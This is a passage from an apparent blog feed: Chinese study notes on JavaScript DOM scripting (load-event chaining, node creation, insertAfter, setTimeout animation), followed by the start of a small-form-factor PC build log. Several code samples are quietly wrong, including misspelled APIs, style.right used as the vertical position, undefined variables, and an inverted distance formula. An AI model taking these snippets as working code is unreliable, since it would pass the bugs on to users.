class="literal">false</span>;</span><br></pre></td></tr></table></figure><h2 id="Js美术馆"><a href="#Js美术馆" class="headerlink" title="Js美术馆"></a>Js美术馆</h2><ul><li>给每个<code>&lt;a&gt;</code>添加<code>class</code>很麻烦</li><li>给整个<code>&lt;ul&gt;</code>设置一个<code>id</code>要简单得多</li></ul><h3 id="结构化程序设计原则"><a href="#结构化程序设计原则" class="headerlink" title="结构化程序设计原则"></a>结构化程序设计原则</h3><blockquote><p>每个函数只应有一个入口和出口</p></blockquote><ul><li>更为实际的操作：出于可读性要求，同一个函数应该有多个出口，但前提是他们应该集中出现在这个函数的开头部分</li></ul><h3 id="创建必要的变量"><a href="#创建必要的变量" class="headerlink" title="创建必要的变量"></a>创建必要的变量</h3><ul><li>增加可读性</li></ul><h3 id="绑定事件处理函数"><a href="#绑定事件处理函数" class="headerlink" title="绑定事件处理函数"></a>绑定事件处理函数</h3><p>每个事件处理函数只能绑定一条指令<br>另如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = firstfunc();</span><br><span class="line"><span class="built_in">window</span>.onload = secondfunc();</span><br></pre></td></tr></table></figure><p>只有最后一个会有用（显然）</p><p>解决方法：创建一个匿名函数来打包，再绑到onload上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  firstfunc();</span><br><span class="line">  secondfunc();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>更好的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addLoadEvent</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.onload = func;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      oldonload();</span><br><span class="line">      func();</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addLoadEvent(firstfunc);</span><br><span class="line">addLoadEvent(secondfunc);</span><br></pre></td></tr></table></figure><ul><li>从效果上看相当于是一层一层包裹起来</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  secondfunc();</span><br><span class="line">  &#123;</span><br><span class="line">    firstfunc();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用onclick取代onkeypress:</p><ul><li>用TAB键移动并用回车选择的操作也算”click”</li></ul><h3 id="DOM和JS"><a href="#DOM和JS" class="headerlink" title="DOM和JS"></a>DOM和JS</h3><blockquote><p>DOM的方法并不专属于Javascript，支持DOM的任何一种程序语言都可以使用它们。它们的用途也并非仅限于处理网页，可以用来处理任何一种标记语言（eg xml）</p></blockquote><p><code>Html-DOM</code>：当使用js和DOM为(X)HTML文件编写时的专属属性，</p><p>例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementByTagName(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简化为</span></span><br><span class="line"><span class="built_in">document</span>.forms;</span><br></pre></td></tr></table></figure><ul><li>注意这样只能处理web文档，而<code>DOM core</code>会更加通用</li></ul><p>更多：<a href="https://www.zhihu.com/question/57601873/answer/155685476">如何理解js高程里的document对象是HTMLDocument的实例？ - 黄玄的回答 - 知乎</a></p><h2 id="动态创建HTML内容"><a href="#动态创建HTML内容" class="headerlink" title="动态创建HTML内容"></a>动态创建HTML内容</h2><ul><li>绝大多数情况下，网页的结构由HTML文档负责，JS只用来改变HTML文档中某些细节而不改底层</li><li>但实际上也能改，例如动态创建HTML内容</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(<span class="string">&quot;&lt;p&gt;example&lt;/p&gt;&quot;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>但这有悖于分离JS的原则，<strong>不应当在html中用<code>&lt;script&gt;</code></strong></li></ul><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><ul><li>非标准DOM(w3c dom标准)<ul><li>innerHTML也只是在HTML文档中可用，在正宗的XHTML中并不支持</li></ul></li><li>它（返回值）是一个<strong>字符串</strong>，用来设置或获取位于对象起始和结束标签内的HTML</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> testdiv = <span class="built_in">document</span>.getElementById(<span class="string">&quot;testdiv&quot;</span>);</span><br><span class="line">  alert(testdiv.innerHTML);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="用标准DOM替代innerHTML"><a href="#用标准DOM替代innerHTML" class="headerlink" title="用标准DOM替代innerHTML"></a>用标准DOM替代innerHTML</h3><blockquote><p><code>setAttribute()</code>改变的内容显然无法通过文本编辑器打开文档查看到，只有在用浏览器打开时才能看到效果。这是因为浏览器实际显示的是那颗DOM树。在浏览器看来，DOM节点树才是文档</p><p>因此想要添加新内容，就应该在DOM节点树上添加新节点</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建元素节点</span></span><br><span class="line"><span class="keyword">var</span> param = <span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>); <span class="comment">// param是一个引用指针</span></span><br><span class="line"><span class="comment">// 创建文本节点</span></span><br><span class="line"><span class="keyword">var</span> txt = <span class="built_in">document</span>.createTextNode(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">param.appendChild(txt); <span class="comment">// 连接尚未成为文档树的节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> testdiv = <span class="built_in">document</span>.getElementById(<span class="string">&quot;testdiv&quot;</span>);</span><br><span class="line">testdiv.appendChild(param); <span class="comment">// 插入DOM</span></span><br></pre></td></tr></table></figure><h3 id="insertBefore"><a href="#insertBefore" class="headerlink" title="insertBefore()"></a>insertBefore()</h3><blockquote><p>属性节点和文本节点的子节点不允许是元素节点</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parentElement.insertBefore(newElement, targetElement);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> gallery=<span class="built_in">document</span>.getElementById(<span class="string">&quot;image&quot;</span>);</span><br><span class="line">gallery.parentNode.insertBefore(placeholder,gallery)</span><br></pre></td></tr></table></figure><p><code>insertAfter()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertAfter</span>(<span class="params">newElement, targetElement</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parent = targetElement.parentNode;</span><br><span class="line">  <span class="keyword">if</span> (parent.lastChild == targetElement) &#123;</span><br><span class="line">    parent.appendChild(newElement);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    parent.insertBefore(newElement, targetElement.nextSibling);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>newElement</code><ul><li>将被插入的新元素</li></ul></li><li><code>targetElement</code><ul><li>新元素将插入到它<strong>后</strong>的目标元素</li><li>同时注意节点数同一层也是有first到last的前后顺序</li><li><code>parent.appendChild(newElement);</code>自然在<code>targetElement</code>后面</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用<code>createElement</code>和<code>createTextNode</code>创造出来的孤儿节点，要用<code>appendChild()</code>和<code>insertBefore</code>挂上节点树</p><h2 id="CSS-DOM"><a href="#CSS-DOM" class="headerlink" title="CSS-DOM"></a>CSS-DOM</h2><p><strong>网页</strong>的组成</p><ul><li>结构层<ul><li>标记语言创建</li></ul></li><li>表示层：如何显示有关内容<ul><li>CSS创建</li></ul></li><li>行为层：内容该如何对事件做出反应</li></ul><p>三者之间存在重合</p><ul><li>比如DOM来改变网页结构</li><li>同样DOM和CSS通过<code>style</code>样式属性连接<ul><li><code>param.style.color=&#39;black&#39;;</code></li></ul></li><li>换句话说：<strong>CSS与HTML在JS里都会映射为DOM</strong></li></ul><blockquote><p>CSS1无法根据某个元素在节点树上的位置来为它声明一种样式，例如“把一下样式施加在所有h1元素的下一个兄弟节点上”</p><p>CSS2引入伪class属性来解决</p></blockquote><h3 id="抽象化"><a href="#抽象化" class="headerlink" title="抽象化"></a>抽象化</h3><ul><li>不要硬编码值，而应当改为变量</li></ul><h2 id="Javascript实现动画效果"><a href="#Javascript实现动画效果" class="headerlink" title="Javascript实现动画效果"></a>Javascript实现动画效果</h2><blockquote><p>随着时间变化不断改变某个元素</p><ul><li>Javascript脚本能按预定的时间间隔重复调用某个函数</li></ul></blockquote><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a>setTimeout()</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;function&quot;</span>, interval)</span><br></pre></td></tr></table></figure><ul><li>setTimeout函数能够让某个函数在经过一个预定时间后才执行</li><li><strong>如果想要取消某个正在排队的函数</strong>，需要将这个setTimeout的返回值赋给一个变量<ul><li><code>variable=setTimeout(&quot;function&quot;, interval)</code></li><li>用<code>clearTimeout</code>来取消：<code>clearTimeout(variable)</code></li></ul></li></ul><h3 id="parseInt"><a href="#parseInt" class="headerlink" title="parseInt()"></a>parseInt()</h3><p><code>parseInt(string, radix)</code></p><blockquote><p><code>parseInt()</code>函数可解析一个字符串，并返回一个整数。</p><ul><li>只有字符串中的第一个数字会被返回。(<code>&quot;10.33&quot;</code>-&gt;<code>10</code>)</li><li>开头和结尾的空格是允许的。</li><li>如果字符串的第一个字符不能被转换为数字，那么<code>parseInt()</code>会返回<code>NaN</code>。</li></ul></blockquote><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">postionMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById(<span class="string">&quot;message&quot;</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;message&quot;</span>);</span><br><span class="line">  elem.style.position = <span class="string">&quot;absolute&quot;</span>;</span><br><span class="line">  elem.style.left = <span class="string">&quot;50px&quot;</span>;</span><br><span class="line">  elem.style.top = <span class="string">&quot;100px&quot;</span>;</span><br><span class="line">  movement = <span class="built_in">setTimeout</span>(<span class="string">&quot;moveMessage()&quot;</span>, <span class="number">5000</span>); <span class="comment">// 5000毫秒（5秒），注意这个变量未用var关键字，它是一个全局变量</span></span><br><span class="line">  <span class="comment">// moveElement(&quot;message&quot;, 200, 100, 10);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">moveMessage只能完成从点到点的移动，移动的信息都硬编码在代码里</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById(<span class="string">&quot;message&quot;</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(<span class="string">&quot;message&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!elem.style.left || !elem.style.right) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 确保属性存在</span></span><br><span class="line">  <span class="keyword">var</span> xpos = <span class="built_in">parseInt</span>(elem.style.left); <span class="comment">// 将&quot;50px&quot;转化为数值50</span></span><br><span class="line">  <span class="keyword">var</span> ypos = <span class="built_in">parseInt</span>(elem.style.right);</span><br><span class="line">  <span class="keyword">if</span> (xpos == <span class="number">200</span> &amp;&amp; ypos == <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="comment">// 移动到了目的地</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (xpos &lt; final_x) xpos++;</span><br><span class="line">  <span class="keyword">if</span> (xpos &gt; final_x) xpos--;</span><br><span class="line">  <span class="keyword">if</span> (ypos &lt; final_y) ypos++;</span><br><span class="line">  <span class="keyword">if</span> (ypos &gt; final_y) ypos--;</span><br><span class="line">  elem.style.left = xpos + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">  elem.style.right = ypos + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> repeat =</span><br><span class="line">    <span class="string">&quot;moveElement(&#x27;&quot;</span> +</span><br><span class="line">    elementID +</span><br><span class="line">    <span class="string">&quot;&#x27;,&quot;</span> +</span><br><span class="line">    final_x +</span><br><span class="line">    <span class="string">&quot;,&quot;</span> +</span><br><span class="line">    final_y +</span><br><span class="line">    <span class="string">&quot;,&quot;</span> +</span><br><span class="line">    interval +</span><br><span class="line">    <span class="string">&quot;)&quot;</span>;</span><br><span class="line">  <span class="comment">// moveElement(&#x27;elementID&#x27;,final_x,final_y,interval)</span></span><br><span class="line">  movement = <span class="built_in">setTimeout</span>(repeat, interval);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">抽象化：</span></span><br><span class="line"><span class="comment">一个通用的，可沿任意方向移动多个页面元素的函数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveElement</span>(<span class="params">elementID, final_x, final_y, interval</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">document</span>.getElementById(elementID)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="built_in">document</span>.getElementById(elementID);</span><br><span class="line">  <span class="keyword">if</span> (!elem.style.left || !elem.style.right) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> xpos = <span class="built_in">parseInt</span>(elem.style.left);</span><br><span class="line">  <span class="keyword">var</span> ypos = <span class="built_in">parseInt</span>(elem.style.right);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (xpos == final_x &amp;&amp; ypos == final_y) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">if</span> (xpos &lt; <span class="number">200</span>) xpos++;</span><br><span class="line">  <span class="keyword">if</span> (xpos &gt; <span class="number">200</span>) xpos--;</span><br><span class="line">  <span class="keyword">if</span> (ypos &lt; <span class="number">100</span>) ypos++;</span><br><span class="line">  <span class="keyword">if</span> (ypos &gt; <span class="number">100</span>) ypos--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">网页加载时挂载</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addLoadEvent</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.onload = func;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      oldonload();</span><br><span class="line">      func();</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addLoadEvent(postionMessage);</span><br></pre></td></tr></table></figure><h4 id="js感叹号"><a href="#js感叹号" class="headerlink" title="js感叹号"></a>js感叹号</h4><p>一个<code>!</code></p><ul><li>可将变量转换成boolean类型</li><li><code>null</code>、<code>undefined</code>和<code>空字符串</code>取反都为false，其余都为true。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!<span class="literal">null</span>=<span class="literal">true</span></span><br><span class="line">!<span class="literal">undefined</span>=<span class="literal">true</span></span><br><span class="line">!<span class="string">&#x27;&#x27;</span>=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">!<span class="number">100</span>=<span class="literal">false</span></span><br><span class="line">!<span class="string">&#x27;abc&#x27;</span>=<span class="literal">false</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h3><h4 id="加快移动速度"><a href="#加快移动速度" class="headerlink" title="加快移动速度"></a>加快移动速度</h4><ul><li>离得远就走得快</li><li>离得近就走得慢</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (xpos &lt; final_x) &#123;</span><br><span class="line">  <span class="keyword">var</span> dist = <span class="built_in">Math</span>.ceil((xpos - final_x) / <span class="number">10</span>);</span><br><span class="line">  xpos += dist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (xpos &gt; final_x) &#123;</span><br><span class="line">  <span class="keyword">var</span> dist = <span class="built_in">Math</span>.ceil((final_x - xpos) / <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;DHTML&quot;&gt;&lt;a href=&quot;#DHTML&quot; class=&quot;headerlink&quot; title=&quot;DHTML&quot;&gt;&lt;/a&gt;DHTML&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;动态HTML&lt;ul&gt;
&lt;li&gt;HTML：&lt;code&gt;网页&lt;/code&gt; –标记为–&amp;gt; &lt;code&gt;元素&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;CSS：设计元素的&lt;strong&gt;排版样式&lt;/strong&gt;以及在窗口中的&lt;strong&gt;显示位置&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;JS：&lt;strong&gt;实时&lt;/strong&gt;改变样式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;css-js：css先静态设定样式，再由js动态改变&lt;/p&gt;
&lt;p&gt;DHTML最终实现：DOM&lt;/p&gt;
&lt;h3 id=&quot;标准&quot;&gt;&lt;a href=&quot;#标准&quot; class=&quot;headerlink&quot; title=&quot;标准&quot;&gt;&lt;/a&gt;标准&lt;/h3&gt;&lt;p&gt;问题：DOM兼容性&lt;br&gt;解决：W3C&lt;/p&gt;
&lt;h2 id=&quot;js语法&quot;&gt;&lt;a href=&quot;#js语法&quot; class=&quot;headerlink&quot; title=&quot;js语法&quot;&gt;&lt;/a&gt;js语法&lt;/h2&gt;&lt;h3 id=&quot;插入&quot;&gt;&lt;a href=&quot;#插入&quot; class=&quot;headerlink&quot; title=&quot;插入&quot;&gt;&lt;/a&gt;插入&lt;/h3&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 嵌入html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 存入独立文件，src指向&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt; scr=&lt;span class=&quot;string&quot;&gt;&amp;quot;file.js&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;语法&quot;&gt;&lt;a href=&quot;#语法&quot; class=&quot;headerlink&quot; title=&quot;语法&quot;&gt;&lt;/a&gt;语法&lt;/h3&gt;</summary>
    
    
    
    <category term="Program Language" scheme="https://hejueyun.github.io/categories/Program-Language/"/>
    
    <category term="Javascript" scheme="https://hejueyun.github.io/categories/Program-Language/Javascript/"/>
    
    <category term="Basic" scheme="https://hejueyun.github.io/categories/Program-Language/Javascript/Basic/"/>
    
    
    <category term="notes" scheme="https://hejueyun.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>[主机]风冷快乐盒M组装记录</title>
    <link href="https://hejueyun.github.io/posts/5200a480/"/>
    <id>https://hejueyun.github.io/posts/5200a480/</id>
    <published>2021-01-17T04:54:32.000Z</published>
    <updated>2021-04-25T07:09:09.286Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>一直想组装一台便携的gaming pc，而笔记本的性能释放、寿命与性价比也是令人捉急，于是最终敲定组装sffpc。</p><ul><li>目标：10L以内。</li><li>预算：6k左右</li><li>性能：守望先锋、战地一等网游在1080p下能有144hz；刺客信条、大镖客2等单机在60帧的基础上有不错的画质<ul><li>可能的话还会用于编程</li></ul></li><li>体验：安静、在itx标准下尽量低温</li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><center><img src="/posts/5200a480/1.png" height="350"></center><table><thead><tr><th>目录</th><th>配件</th><th>价格</th></tr></thead><tbody><tr><td>主板</td><td>Gigabyte B450i</td><td>见下</td></tr><tr><td>CPU</td><td>AMD R5 3500x</td><td>板U套装 1679</td></tr><tr><td>显卡</td><td>Gigabyte GTX 1660 SUPER MINI ITX OC</td><td>1529</td></tr><tr><td>电源</td><td>Cosair SF450</td><td>电源模组线套装 629</td></tr><tr><td>内存</td><td>Klevv CJR DDR4-2666 x2</td><td>339</td></tr><tr><td>固态硬盘</td><td>Kioxia RC10 250G</td><td>345</td></tr><tr><td>cpu散热</td><td>Noctua NH-D9L, with second optional NF-A9</td><td>490</td></tr><tr><td>机箱散热</td><td>Noctua NF-A6x25 x2; Arctic P12 x2</td><td>115x2; 59x2</td></tr><tr><td>机箱</td><td>(WARHEAD)风冷快乐盒M</td><td>1000(闲鱼价，原价606)</td></tr><tr><td>额外配件</td><td>模组电源线; ADT R33SL显卡延长线</td><td>见上; 118</td></tr><tr><td>总计</td><td>-</td><td>6480（6083）</td></tr></tbody></table><ul><li>话说这机箱在<a href="https://caseend.com/brand/warhead/">CaseEnd</a>上都找不到</li><li>也有考虑过10400+b460i的组合，温度和供电应该会好一些，但一来是要贵个300百多，二来10400焊钎和硅脂混用摸奖，所以最后还是选了3500x+b450i</li><li>现在想来，感觉SSD买小了…</li></ul><h2 id="组装"><a href="#组装" class="headerlink" title="组装"></a>组装</h2><h3 id="开放平台点亮测试"><a href="#开放平台点亮测试" class="headerlink" title="开放平台点亮测试"></a>开放平台点亮测试</h3><center><img src="/posts/5200a480/3.png" height="300"></center><ul><li>20年10周生产，体质应该不错</li></ul><center><img src="/posts/5200a480/2.png" 